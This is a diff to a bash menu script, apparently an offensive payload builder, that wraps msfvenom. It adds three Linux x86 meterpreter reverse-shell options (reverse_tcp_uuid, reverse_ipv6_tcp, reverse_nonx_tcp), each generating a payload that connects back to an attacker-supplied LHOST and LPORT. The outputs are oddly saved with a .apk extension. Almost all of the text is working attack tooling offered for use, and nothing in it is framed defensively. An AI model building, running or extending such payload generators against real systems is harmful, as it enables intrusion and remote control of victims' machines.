@@ -184,6 +184,9 @@ linux (){
     echo -e "${White}[1] ${Purple}linux/x86/meterpreter_reverse_tcp         ${Blue}        +"
     echo -e "+ ${White}[2] ${Purple}linux/x86/meterpreter_reverse_https       ${Blue}        +"
     echo -e "+ ${White}[3] ${Purple}linux/x86/meterpreter_reverse_http       ${Blue}         +"
+    echo -e "+ ${White}[4] ${Purple}linux/x86/meterpreter/reverse_tcp_uuid   ${Blue}         +"
+    echo -e "+ ${White}[5] ${Purple}linux/x86/meterpreter/reverse_ipv6_tcp   ${Blue}         +"
+    echo -e "+ ${White}[6] ${Purple}linux/x86/meterpreter/reverse_nonx_tcp   ${Blue}         +"
     echo -e "${Blue}+-------------------------------------------------------+"
     sleep 0.3
     echo -ne "${Green}[#] Choose a payload: ${White}" 
@@ -215,6 +218,31 @@ linux (){
         msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
         payload='linux/x86/meterpreter_reverse_http' ;;
 
+        4)
+        target
+        echo
+          echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p linux/x86/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
+        payload='linux/x86/meterpreter/reverse_tcp_uuid' ;;
+        
+        5)
+        target
+        echo
+          echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p linux/x86/meterpreter/reverse_ipv6_tcp LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
+        payload='linux/x86/meterpreter/reverse_ipv6_tcp' ;;
+        
+        6)
+        target
+        echo
+          echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p linux/x86/meterpreter/reverse_nonx_tcp LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
+        payload='linux/x86/meterpreter/reverse_nonx_tcp' ;;
+
+    
         * )
 	echo -e "${Cyan}[*] INVALID CHOICE!"  
         sleep 1
